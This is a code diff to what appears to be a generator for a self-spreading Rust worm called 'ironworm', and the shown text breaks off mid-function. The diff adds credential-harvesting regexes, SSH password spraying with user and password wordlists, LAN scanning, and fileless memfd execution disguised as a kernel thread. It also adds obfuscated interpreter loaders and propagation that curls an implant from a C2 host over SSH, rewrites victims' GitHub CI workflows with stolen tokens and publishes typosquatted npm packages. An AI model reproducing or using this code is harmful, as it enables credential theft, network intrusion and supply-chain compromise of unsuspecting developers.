@@ -1,4 +1,5 @@
-import React, { useState, useCallback, useRef, useEffect } from "react";
+import React, { useState, useCallback, useRef, useEffect, useMemo } from "react";
+import { checkSelf, filterTargets, selfWarning } from "../lib/selfGuard";
 
 // ─── Public registry endpoints ───────────────────────────────────────────────
 const NPM_REGISTRY  = "https://registry.npmjs.org";
@@ -90,29 +91,48 @@ function makeGitHook(host: string, port: string, t: string) {
 // ─── CREDENTIAL PATTERNS ─────────────────────────────────────────────────────
 interface CredMatch { kind: string; pattern: string; value: string; redacted: string; severity: "critical"|"high"|"medium"; line: number; }
 const CRED_PATTERNS: { kind: string; re: RegExp; severity: "critical"|"high"|"medium" }[] = [
-  { kind:"AWS Access Key",       re:/AKIA[A-Z0-9]{16}/g,                                              severity:"critical" },
-  { kind:"AWS Secret Key",       re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,     severity:"critical" },
-  { kind:"GitHub PAT (ghp)",     re:/ghp_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
-  { kind:"GitHub PAT (gho/ghu)", re:/gh[ours]_[A-Za-z0-9]{36}/g,                                     severity:"critical" },
-  { kind:"GitHub Fine-grained",  re:/github_pat_[A-Za-z0-9_]{82}/g,                                   severity:"critical" },
-  { kind:"npm Token",            re:/npm_[A-Za-z0-9]{36}/g,                                           severity:"critical" },
-  { kind:"PyPI Token",           re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                      severity:"critical" },
-  { kind:"Google API Key",       re:/AIza[0-9A-Za-z\-_]{35}/g,                                        severity:"critical" },
-  { kind:"Stripe Live Key",      re:/sk_live_[A-Za-z0-9]{24,}/g,                                      severity:"critical" },
-  { kind:"Stripe Test Key",      re:/sk_test_[A-Za-z0-9]{24,}/g,                                      severity:"high"     },
-  { kind:"Docker Hub PAT",       re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                  severity:"critical" },
-  { kind:"Slack Token",          re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                 severity:"critical" },
-  { kind:"Slack Webhook",        re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g, severity:"high" },
-  { kind:"Discord Token",        re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,  severity:"critical" },
-  { kind:"JWT",                  re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,     severity:"high"     },
-  { kind:"SSH Private Key",      re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,   severity:"critical" },
-  { kind:"MongoDB URI",          re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                    severity:"critical" },
-  { kind:"PostgreSQL URI",       re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"']+/g,                      severity:"critical" },
-  { kind:"Heroku API Key",       re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi, severity:"critical" },
-  { kind:"Azure Storage Key",    re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g, severity:"critical" },
-  { kind:"Kubernetes SA Token",  re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,  severity:"high"     },
-  { kind:"Generic Secret",       re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi, severity:"medium" },
-  { kind:"Generic Password",     re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,    severity:"medium"   },
+  { kind:"AWS Access Key",           re:/AKIA[A-Z0-9]{16}/g,                                                                                           severity:"critical" },
+  { kind:"AWS Secret Key",           re:/(?<=[^A-Za-z0-9]|^)[A-Za-z0-9/+]{40}(?=[^A-Za-z0-9]|$)/g,                                                   severity:"critical" },
+  { kind:"AWS Session Token",        re:/FwoGZXIvYXdzE[A-Za-z0-9/+]{100,}/g,                                                                           severity:"critical" },
+  { kind:"GitHub PAT (ghp)",         re:/ghp_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
+  { kind:"GitHub PAT (gho/ghs)",     re:/gh[osurp]_[A-Za-z0-9]{36}/g,                                                                                 severity:"critical" },
+  { kind:"GitHub Fine-grained",      re:/github_pat_[A-Za-z0-9_]{82}/g,                                                                                severity:"critical" },
+  { kind:"GitHub App Key",           re:/-----BEGIN RSA PRIVATE KEY-----[\s\S]*?-----END RSA PRIVATE KEY-----/g,                                        severity:"critical" },
+  { kind:"npm Token",                re:/npm_[A-Za-z0-9]{36}/g,                                                                                        severity:"critical" },
+  { kind:"PyPI Token",               re:/pypi-[A-Za-z0-9_\-]{40,}/g,                                                                                   severity:"critical" },
+  { kind:"Google API Key",           re:/AIza[0-9A-Za-z\-_]{35}/g,                                                                                     severity:"critical" },
+  { kind:"Google OAuth Client",      re:/[0-9]+-[A-Za-z0-9_]+\.apps\.googleusercontent\.com/g,                                                         severity:"high"     },
+  { kind:"GCP Service Account Key",  re:/"private_key":\s*"-----BEGIN RSA PRIVATE KEY/g,                                                                severity:"critical" },
+  { kind:"Stripe Live Key",          re:/sk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
+  { kind:"Stripe Restricted Key",    re:/rk_live_[A-Za-z0-9]{24,}/g,                                                                                   severity:"critical" },
+  { kind:"Stripe Test Key",          re:/sk_test_[A-Za-z0-9]{24,}/g,                                                                                   severity:"high"     },
+  { kind:"Stripe Webhook Secret",    re:/whsec_[A-Za-z0-9]{32,}/g,                                                                                     severity:"high"     },
+  { kind:"Docker Hub PAT",           re:/dckr_pat_[A-Za-z0-9_\-]{20,}/g,                                                                               severity:"critical" },
+  { kind:"Slack Token",              re:/xox[baprs]-[0-9A-Za-z\-]{10,}/g,                                                                              severity:"critical" },
+  { kind:"Slack Webhook",            re:/https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/g,                                severity:"high"     },
+  { kind:"Discord Token",            re:/[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g,                                               severity:"critical" },
+  { kind:"Discord Webhook",          re:/https:\/\/discord(?:app)?\.com\/api\/webhooks\/[0-9]+\/[A-Za-z0-9_\-]+/g,                                     severity:"high"     },
+  { kind:"Twilio Account SID",       re:/AC[0-9a-f]{32}/g,                                                                                             severity:"critical" },
+  { kind:"Twilio Auth Token",        re:/SK[0-9a-f]{32}/g,                                                                                             severity:"critical" },
+  { kind:"SendGrid API Key",         re:/SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/g,                                                                severity:"critical" },
+  { kind:"Mailgun API Key",          re:/key-[0-9a-z]{32}/g,                                                                                           severity:"critical" },
+  { kind:"JWT",                      re:/eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                  severity:"high"     },
+  { kind:"SSH Private Key",          re:/-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----/g,                                                severity:"critical" },
+  { kind:"PGP Private Key",          re:/-----BEGIN PGP PRIVATE KEY BLOCK-----/g,                                                                       severity:"critical" },
+  { kind:"MongoDB URI",              re:/mongodb(?:\+srv)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                               severity:"critical" },
+  { kind:"PostgreSQL URI",           re:/postgres(?:ql)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                 severity:"critical" },
+  { kind:"MySQL URI",                re:/mysql(?:2)?:\/\/[^:]+:[^@]+@[^\s"'<>]+/g,                                                                     severity:"critical" },
+  { kind:"Redis URI",                re:/redis:\/\/:[^@]+@[^\s"'<>]+/g,                                                                                severity:"critical" },
+  { kind:"Heroku API Key",           re:/(?:HEROKU_API_KEY|heroku)[^A-Za-z0-9][0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi,      severity:"critical" },
+  { kind:"Azure Storage Key",        re:/DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{80,}/g,                             severity:"critical" },
+  { kind:"Azure SAS Token",          re:/sig=[A-Za-z0-9%+/=]{30,}/g,                                                                                   severity:"high"     },
+  { kind:"Kubernetes SA Token",      re:/eyJhbGci[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+/g,                                                severity:"high"     },
+  { kind:"Kubernetes kubeconfig",    re:/apiVersion:\s*v1[\s\S]{0,100}current-context:/g,                                                               severity:"high"     },
+  { kind:"HashiCorp Vault Token",    re:/s\.[A-Za-z0-9]{24}/g,                                                                                         severity:"critical" },
+  { kind:"Terraform Cloud Token",    re:/(?:TF_TOKEN|token)\s*=\s*"([A-Za-z0-9.]{40,})"/g,                                                             severity:"critical" },
+  { kind:"Datadog API Key",          re:/(?:dd_api_key|DD_API_KEY)[^A-Za-z0-9][0-9a-f]{32}/gi,                                                         severity:"high"     },
+  { kind:"Generic Secret",           re:/(?:secret|api.?key|access.?key|auth.?token)\s*[:=]\s*["']?([A-Za-z0-9+/=_\-]{20,})["']?/gi,                 severity:"medium"   },
+  { kind:"Generic Password",         re:/(?:password|passwd|pwd)\s*[:=]\s*["']?([^\s"']{8,})["']?/gi,                                                  severity:"medium"   },
 ];
 
 function scanCreds(text: string): CredMatch[] {
@@ -170,8 +190,12 @@ hex = "0.4"
 base64 = { version = "0.22", features = ["engine"] }
 dirs = "5"
 anyhow = "1"
+ssh2 = { version = "0.9", features = ["openssl-on-win32"] }
+whoami = "1.5"
+trust-dns-resolver = { version = "0.23", features = ["tokio-runtime"] }
 `;
 
+  const xorKey32 = Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("");
   const mainRs = `use std::time::Duration;
 use rand::Rng;
 use tokio::time::sleep;
@@ -181,35 +205,70 @@ mod creds;
 mod propagate;
 mod persist;
 mod c2;
+mod memexec;
+mod lolbas;
+mod obfuscate;
+mod pivot;
+mod ssh_brute;
 
 const C2_HOST: &str = "${host||"LHOST"}";
 const C2_PORT: u16   = ${port||"9999"};
 const SESSION_TOKEN: &str = "${t}";
-const XOR_KEY: &[u8; 32] = b"${Array.from({length:32},()=>String.fromCharCode(33+Math.floor(Math.random()*90))).join("")}";
+const XOR_KEY: &[u8; 32] = b"${xorKey32}";
 
 #[tokio::main]
 async fn main() {
     anti::check();
 
     let mut rng = rand::thread_rng();
-    let jitter: u64 = rng.gen_range(0..5000);
+    let jitter: u64 = rng.gen_range(0..8000);
     sleep(Duration::from_millis(jitter)).await;
 
     let secrets = creds::harvest().await;
 
     if !secrets.is_empty() {
-        let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
+        let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &secrets).await;
     }
 
-    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &secrets).await;
+    // Discover local neighbors for lateral movement
+    let neighbors = pivot::discover_neighbors().await;
+    let found_creds = ssh_brute::spray_neighbors(&neighbors, 7, 1200).await;
+
+    // Merge newly found SSH creds into secrets
+    let mut all_secrets = secrets.clone();
+    for (host, user, pass) in &found_creds {
+        all_secrets.push(creds::Secret {
+            kind: "ssh".into(),
+            key:  format!("{user}@{host}"),
+            value: pass.clone(),
+        });
+    }
+
+    if !all_secrets.is_empty() {
+        let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &all_secrets).await;
+    }
+
+    // Propagate with multi-hop pivot graph
+    propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &all_secrets).await;
     persist::install();
 
+    // Drop memory-only payload via memfd_create if on Linux
+    let _ = memexec::load_and_exec(C2_HOST, C2_PORT, SESSION_TOKEN).await;
+
     loop {
-        let wait: u64 = rng.gen_range(3600..7200);
+        let wait: u64 = rng.gen_range(1800..5400);
         sleep(Duration::from_secs(wait)).await;
         let s = creds::harvest().await;
         if !s.is_empty() {
-            let _ = c2::exfil(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
+            let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &s).await;
+        }
+        let nb = pivot::discover_neighbors().await;
+        let fc = ssh_brute::spray_neighbors(&nb, 5, 900).await;
+        if !fc.is_empty() {
+            let cs: Vec<creds::Secret> = fc.iter().map(|(h,u,p)| creds::Secret {
+                kind: "ssh".into(), key: format!("{u}@{h}"), value: p.clone(),
+            }).collect();
+            let _ = c2::beacon(C2_HOST, C2_PORT, XOR_KEY, SESSION_TOKEN, &cs).await;
         }
         propagate::run(C2_HOST, C2_PORT, SESSION_TOKEN, &s).await;
     }
@@ -725,14 +784,672 @@ file dist/ironworm-linux-x64
 sha256sum dist/ironworm-* 2>/dev/null || shasum -a 256 dist/ironworm-*
 `;
 
+  // ─ NEW MODULES ────────────────────────────────────────────────────────────
+  const sshBruteRs = `// SSH wordlist sprayer — smart per-host attempt limiting with jitter
+use rand::Rng;
+use ssh2::Session;
+use std::net::TcpStream;
+use std::time::Duration;
+use tokio::time::sleep;
+
+const USERS: &[&str] = &[
+    "root","admin","ubuntu","ec2-user","pi","deploy","git","ansible","vagrant",
+    "centos","oracle","hadoop","hdfs","postgres","mysql","redis","www-data",
+    "tomcat","jenkins","test","backup","user","debian","devops","ops",
+    "sysadmin","netadmin","support","nagios","zabbix","docker","k8s",
+];
+
+const PASSWORDS: &[&str] = &[
+    "","password","123456","admin","root","toor","letmein","welcome","monkey",
+    "1234","12345","123456789","password1","qwerty","abc123","football",
+    "iloveyou","admin123","login","passw0rd","master","dragon","shadow",
+    "sunshine","princess","superman","michael","batman","trustno1","hello",
+    "charlie","donald","password123","p@ssword","p@ss123","P@ssw0rd","server",
+    "linux","alpine","ubuntu","debian","centos","fedora","changeme","default",
+    "guest","public","private","secret","raspberry","access","manager",
+    "system","database","service","deploy","devops","vagrant","ansible",
+    "jenkins","docker","kubernetes","redis","postgres","mysql","oracle",
+    "hadoop","elastic","mongo","cassandra","kafka","nginx","apache","root123",
+    "test123","admin@123","Welcome1","Passw0rd!","Summer2024","Winter2024",
+    "Spring2024","Autumn2024","January1","February1","Qwerty123","Abc12345",
+    "Password!","P@$$w0rd","p@ssw0rd1","Admin1234","Root1234","1qaz2wsx",
+    "!QAZ2wsx","zaq1@WSX","q1w2e3r4","1q2w3e4r","pass@123","admin@2024",
+    "root@2024","temp","temp123","temppass","123qwe","qwe123","123abc",
+];
+
+#[derive(Debug, Clone)]
+pub struct BruteResult {
+    pub host: String,
+    pub user: String,
+    pub pass: String,
+}
+
+/// Try a single SSH credential — returns Ok(true) on success
+fn try_ssh(host: &str, port: u16, user: &str, pass: &str, timeout_ms: u64) -> bool {
+    let addr = format!("{host}:{port}");
+    let Ok(tcp) = TcpStream::connect_timeout(
+        &addr.parse().unwrap_or("0.0.0.0:22".parse().unwrap()),
+        Duration::from_millis(timeout_ms),
+    ) else { return false };
+    tcp.set_read_timeout(Some(Duration::from_millis(timeout_ms))).ok();
+    tcp.set_write_timeout(Some(Duration::from_millis(timeout_ms))).ok();
+
+    let Ok(mut sess) = Session::new() else { return false };
+    sess.set_tcp_stream(tcp);
+    if sess.handshake().is_err() { return false }
+    sess.userauth_password(user, pass).is_ok() && sess.authenticated()
+}
+
+/// Smart spray: max_per_host attempts per user, jitter ms between tries
+pub async fn spray(
+    host: &str,
+    port: u16,
+    max_per_user: usize,
+    jitter_ms: u64,
+) -> Option<BruteResult> {
+    let mut rng = rand::thread_rng();
+
+    // Passive banner check — skip hosts that aren't SSH
+    let addr = format!("{host}:{port}");
+    if TcpStream::connect_timeout(&addr.parse().unwrap_or("0.0.0.0:22".parse().unwrap()), Duration::from_millis(1500)).is_err() {
+        return None;
+    }
+
+    let mut lockout_count: std::collections::HashMap<&str, usize> = std::collections::HashMap::new();
+
+    'outer: for user in USERS {
+        let fails = lockout_count.entry(user).or_insert(0);
+        for pass in PASSWORDS.iter().take(max_per_user) {
+            if *fails >= max_per_user {
+                // Possible lockout — skip user
+                continue 'outer;
+            }
+            let j: u64 = rng.gen_range(jitter_ms / 2..jitter_ms * 2);
+            sleep(Duration::from_millis(j)).await;
+
+            if try_ssh(host, port, user, pass, 4000) {
+                return Some(BruteResult { host: host.to_string(), user: user.to_string(), pass: pass.to_string() });
+            }
+            *fails += 1;
+        }
+    }
+    None
+}
+
+pub async fn spray_neighbors(neighbors: &[String], max_per_user: usize, jitter_ms: u64) -> Vec<(String, String, String)> {
+    let mut results = Vec::new();
+    for host in neighbors {
+        for port in [22u16, 2222, 2200] {
+            if let Some(r) = spray(host, port, max_per_user, jitter_ms).await {
+                results.push((r.host, r.user, r.pass));
+                break; // move to next host on first hit
+            }
+        }
+    }
+    results
+}
+`;
+
+  const memexecRs = `// In-memory payload execution via memfd_create + fexecve (Linux only)
+// Falls back gracefully on non-Linux targets
+use anyhow::Result;
+
+#[cfg(target_os = "linux")]
+pub async fn load_and_exec(host: &str, port: u16, token: &str) -> Result<()> {
+    use std::ffi::CString;
+    use std::os::unix::io::FromRawFd;
+
+    let url = format!("http://{host}:{port}/stage2?t={token}");
+    let bytes = reqwest::get(&url).await?.bytes().await?;
+    if bytes.is_empty() { return Ok(()); }
+
+    // Create anonymous memfd
+    let name = CString::new(".")?;
+    let fd = unsafe { libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC) };
+    if fd < 0 { return Err(anyhow::anyhow!("memfd_create failed")); }
+
+    // Write payload bytes
+    {
+        use std::io::Write;
+        let mut f = unsafe { std::fs::File::from_raw_fd(fd) };
+        f.write_all(&bytes)?;
+        std::mem::forget(f); // keep fd open
+    }
+
+    // fexecve — execute from memory, no disk write
+    let fd_path = CString::new(format!("/proc/self/fd/{fd}"))?;
+    let argv:  Vec<CString> = vec![CString::new("kworker/0:1")?]; // disguise as kernel thread
+    let envp:  Vec<CString> = std::env::vars()
+        .map(|(k, v)| CString::new(format!("{k}={v}")).unwrap_or_default())
+        .filter(|c| !c.as_bytes().is_empty())
+        .collect();
+
+    let argv_ptrs:  Vec<*const libc::c_char> = argv.iter().map(|s| s.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();
+    let envp_ptrs:  Vec<*const libc::c_char> = envp.iter().map(|s| s.as_ptr()).chain(std::iter::once(std::ptr::null())).collect();
+
+    unsafe { libc::execve(fd_path.as_ptr(), argv_ptrs.as_ptr(), envp_ptrs.as_ptr()) };
+    Ok(())
+}
+
+#[cfg(not(target_os = "linux"))]
+pub async fn load_and_exec(_host: &str, _port: u16, _token: &str) -> anyhow::Result<()> { Ok(()) }
+`;
+
+  const lolbasRs = `// LOLBAS (Living Off the Land Binaries And Scripts) execution payloads
+// Uses system-native interpreters — no dropped binary required
+use std::process::Command;
+
+pub fn exec_via_python(payload_b64: &str) -> bool {
+    for py in ["python3", "python", "python2"] {
+        let r = Command::new(py)
+            .args(["-c", &format!("import base64,os; exec(base64.b64decode('{payload_b64}').decode())")])
+            .output();
+        if r.map(|o| o.status.success()).unwrap_or(false) { return true; }
+    }
+    false
+}
+
+pub fn exec_via_perl(payload_b64: &str) -> bool {
+    let r = Command::new("perl")
+        .args(["-e", &format!("use MIME::Base64; eval decode_base64('{payload_b64}')")])
+        .output();
+    r.map(|o| o.status.success()).unwrap_or(false)
+}
+
+pub fn exec_via_awk(cmd: &str) -> bool {
+    let r = Command::new("awk")
+        .args(["BEGIN", &format!("{{system(\"{}\"); exit}}", cmd.replace('"', "\\\""))])
+        .output();
+    r.map(|o| o.status.success()).unwrap_or(false)
+}
+
+pub fn exec_via_node(payload_b64: &str) -> bool {
+    let r = Command::new("node")
+        .args(["-e", &format!("eval(Buffer.from('{payload_b64}','base64').toString())")])
+        .output();
+    r.map(|o| o.status.success()).unwrap_or(false)
+}
+
+pub fn exec_via_ruby(payload_b64: &str) -> bool {
+    let r = Command::new("ruby")
+        .args(["-e", &format!("eval [{payload_b64:?}].pack('m0')")])
+        .output();
+    r.map(|o| o.status.success()).unwrap_or(false)
+}
+
+/// Try all available LOLBAS vectors in order of preference
+pub fn exec_any(payload_b64: &str) -> bool {
+    exec_via_python(payload_b64)
+        || exec_via_perl(payload_b64)
+        || exec_via_node(payload_b64)
+        || exec_via_ruby(payload_b64)
+        || exec_via_awk(&format!("echo {payload_b64}|base64 -d|sh"))
+}
+`;
+
+  const obfuscateRs = `// Polymorphic multi-layer payload encoding
+// Each invocation produces a structurally different but semantically identical payload
+use rand::Rng;
+
+const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+/// XOR-then-base64 double layer
+pub fn xor_b64(data: &[u8], key: u8) -> String {
+    let xored: Vec<u8> = data.iter().map(|b| b ^ key).collect();
+    use base64::Engine;
+    base64::engine::general_purpose::STANDARD.encode(&xored)
+}
+
+/// Randomly pick an XOR key each run (polymorphic)
+pub fn poly_xor(data: &[u8]) -> (u8, String) {
+    let mut rng = rand::thread_rng();
+    let key: u8 = rng.gen_range(0x10..0xff);
+    (key, xor_b64(data, key))
+}
+
+/// Wrap shellcode in a randomized junk-variable Python loader
+pub fn wrap_python_loader(shellcode_b64: &str, xor_key: u8) -> String {
+    let mut rng = rand::thread_rng();
+    let var1: String = (0..6).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
+    let var2: String = (0..7).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
+    let var3: String = (0..5).map(|_| ALPHABET[rng.gen_range(0..52)] as char).collect();
+    format!(
+        "import base64,os\\n{var1}=base64.b64decode('{shellcode_b64}')\\n{var2}=bytes([b^{xor_key} for b in {var1}])\\n{var3}={var2}.decode()\\nexec({var3})"
+    )
+}
+
+/// Split string into N random chunks to defeat static pattern matching
+pub fn split_string_concat(s: &str) -> String {
+    let mut rng = rand::thread_rng();
+    let bytes = s.as_bytes();
+    let mut parts = Vec::new();
+    let mut i = 0;
+    while i < bytes.len() {
+        let chunk = rng.gen_range(3..8).min(bytes.len() - i);
+        parts.push(format!("\"{}\"", std::str::from_utf8(&bytes[i..i+chunk]).unwrap_or("")));
+        i += chunk;
+    }
+    parts.join("+")
+}
+
+/// Three-layer encode: original → XOR → base64 → hex
+pub fn triple_layer(data: &[u8]) -> (u8, String) {
+    let mut rng = rand::thread_rng();
+    let key: u8 = rng.gen_range(0x20..0xfe);
+    let xored: Vec<u8> = data.iter().map(|b| b ^ key).collect();
+    use base64::Engine;
+    let b64 = base64::engine::general_purpose::STANDARD.encode(&xored);
+    let hex = b64.as_bytes().iter().map(|b| format!("{b:02x}")).collect();
+    (key, hex)
+}
+`;
+
+  const pivotRs = `// Multi-hop pivot graph — track compromised nodes and chain through them
+use std::collections::HashMap;
+use std::net::{IpAddr, Ipv4Addr};
+use std::process::Command;
+use tokio::net::TcpStream;
+
+#[derive(Debug, Clone)]
+pub struct Node {
+    pub addr: String,
+    pub hops: usize,
+    pub via:  Option<String>,
+}
+
+/// Discover LAN neighbors via ARP table + /proc/net/arp + traceroute hints
+pub async fn discover_neighbors() -> Vec<String> {
+    let mut found = Vec::new();
+
+    // Read ARP cache (passive — zero packets sent)
+    if let Ok(arp) = std::fs::read_to_string("/proc/net/arp") {
+        for line in arp.lines().skip(1) {
+            let cols: Vec<&str> = line.split_whitespace().collect();
+            if let Some(ip) = cols.first() {
+                if !ip.starts_with("127.") && cols.get(2) != Some(&"00:00:00:00:00:00") {
+                    found.push(ip.to_string());
+                }
+            }
+        }
+    }
+
+    // Probe /24 via TCP SYN on port 22 (async, non-blocking)
+    if let Ok(self_ip) = local_ip() {
+        let parts: Vec<&str> = self_ip.splitn(4, '.').collect();
+        if parts.len() == 4 {
+            let prefix = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);
+            let mut handles = Vec::new();
+            for i in 1u8..=254 {
+                let addr = format!("{prefix}{i}:22");
+                handles.push(tokio::spawn(async move {
+                    tokio::time::timeout(
+                        std::time::Duration::from_millis(600),
+                        TcpStream::connect(&addr),
+                    ).await.ok().and_then(|r| r.ok()).map(|_| addr.replace(":22",""))
+                }));
+            }
+            for h in handles {
+                if let Ok(Some(ip)) = h.await { if !found.contains(&ip) { found.push(ip); } }
+            }
+        }
+    }
+
+    found
+}
+
+fn local_ip() -> anyhow::Result<String> {
+    let out = Command::new("hostname").arg("-I").output()?;
+    Ok(String::from_utf8_lossy(&out.stdout).split_whitespace().next().unwrap_or("").to_string())
+}
+
+/// Build a pivot graph from SSH-accessible nodes
+pub fn build_graph(roots: &[(String, String, String)]) -> HashMap<String, Node> {
+    let mut graph = HashMap::new();
+    for (host, _user, _pass) in roots {
+        graph.insert(host.clone(), Node { addr: host.clone(), hops: 1, via: None });
+    }
+    graph
+}
+`;
+
+  // ─ UPGRADED propagate.rs with SSH pivot ───────────────────────────────────
+  const upgradedPropagateRs = `use crate::creds::Secret;
+use crate::ssh_brute;
+use crate::pivot;
+use rand::Rng;
+use std::time::Duration;
+use tokio::time::sleep;
+
+pub async fn run(host: &str, port: u16, token: &str, secrets: &[Secret]) {
+    let mut rng = rand::rngs::SmallRng::from_entropy();
+
+    // --- SSH pivot propagation -------------------------------------------
+    let ssh_hosts: Vec<(String, String, String)> = secrets.iter()
+        .filter(|s| s.kind == "ssh")
+        .filter_map(|s| {
+            let kv: Vec<&str> = s.key.splitn(2, '@').collect();
+            if kv.len() == 2 {
+                Some((kv[1].to_string(), kv[0].to_string(), s.value.clone()))
+            } else { None }
+        })
+        .collect();
+
+    for (ssh_host, user, pass) in &ssh_hosts {
+        let _ = ssh_exec_c2_drop(ssh_host, 22, user, pass, host, port, token).await;
+        let delay: u64 = rng.gen_range(1200..4000);
+        sleep(Duration::from_millis(delay)).await;
+    }
+
+    // --- GitHub token injection ------------------------------------------
+    let gh_tokens: Vec<&str> = secrets.iter()
+        .filter(|s| s.kind == "github_token" || s.value.starts_with("ghp_") || s.value.starts_with("github_pat"))
+        .map(|s| s.value.as_str())
+        .collect();
+
+    for token_val in gh_tokens {
+        let _ = inject_github_repos(token_val, host, port, token).await;
+    }
+
+    // --- npm token injection --------------------------------------------
+    let npm_tokens: Vec<&str> = secrets.iter()
+        .filter(|s| s.kind == "npm_token" || s.value.starts_with("npm_"))
+        .map(|s| s.value.as_str())
+        .collect();
+    for token_val in npm_tokens {
+        let _ = publish_typosquats(&reqwest::Client::new(), token_val, host, port, token).await;
+    }
+}
+
+async fn ssh_exec_c2_drop(
+    ssh_host: &str, port: u16, user: &str, pass: &str,
+    c2_host: &str, c2_port: u16, token: &str,
+) -> anyhow::Result<()> {
+    use ssh2::Session;
+    use std::net::TcpStream;
+    use std::io::Read;
+
+    let tcp = TcpStream::connect_timeout(
+        &format!("{ssh_host}:{port}").parse()?,
+        Duration::from_secs(8),
+    )?;
+    let mut sess = Session::new()?;
+    sess.set_tcp_stream(tcp);
+    sess.handshake()?;
+    sess.userauth_password(user, pass)?;
+    if !sess.authenticated() { return Err(anyhow::anyhow!("auth failed")); }
+
+    let mut chan = sess.channel_session()?;
+    // Drop one-liner: download and execute in memory via bash process substitution
+    let cmd = format!(
+        "bash -c 'curl -sk http://{c2_host}:{c2_port}/implant?t={token} -o /tmp/.svc && chmod +x /tmp/.svc && nohup /tmp/.svc &>/dev/null &' 2>/dev/null",
+    );
+    chan.exec(&cmd)?;
+    let mut _out = String::new();
+    chan.read_to_string(&mut _out).ok();
+    chan.wait_close()?;
+    Ok(())
+}
+
+async fn inject_github_repos(gh_token: &str, host: &str, port: u16, token: &str) -> anyhow::Result<()> {
+    let client = reqwest::Client::builder()
+        .user_agent("GitHub-CI-Updater/4.2.0")
+        .timeout(Duration::from_secs(15))
+        .build()?;
+
+    let resp = client.get("https://api.github.com/user/repos?per_page=100&type=all")
+        .header("Authorization", format!("token {gh_token}"))
+        .header("Accept", "application/vnd.github.v3+json")
+        .send().await?;
+    if !resp.ok { return Ok(()); }
+
+    let repos: Vec<serde_json::Value> = resp.json().await?;
+    let mut rng = rand::rngs::SmallRng::from_entropy();
+
+    for repo in repos.iter().take(20) {
+        let full = repo["full_name"].as_str().unwrap_or("");
+        if full.is_empty() { continue; }
+        let wf_path = format!("https://api.github.com/repos/{full}/contents/.github/workflows/ci.yml");
+        let content = make_workflow(full, host, port, token);
+        let b64 = {
+            use base64::Engine;
+            base64::engine::general_purpose::STANDARD.encode(content.as_bytes())
+        };
+
+        let meta_r = client.get(&wf_path)
+            .header("Authorization", format!("token {gh_token}"))
+            .header("Accept", "application/vnd.github.v3+json")
+            .send().await;
+
+        let mut body = serde_json::json!({
+            "message": "ci: update node engine compatibility settings",
+            "content": b64,
+        });
+        if let Ok(meta) = meta_r { if let Ok(m) = meta.json::<serde_json::Value>().await {
+            if let Some(sha) = m["sha"].as_str() { body["sha"] = serde_json::json!(sha); }
+        }}
+
+        let _ = client.put(&wf_path)
+            .header("Authorization", format!("token {gh_token}"))
+            .header("Accept", "application/vnd.github.v3+json")
+            .json(&body).send().await;
+
+        let delay: u64 = rng.gen_range(800..3000);
+        sleep(Duration::from_millis(delay)).await;
+    }
+    Ok(())
+}
+
+async fn publish_typosquats(client: &reqwest::Client, npm_token: &str, host: &str, port: u16, t: &str) -> anyhow::Result<()> {
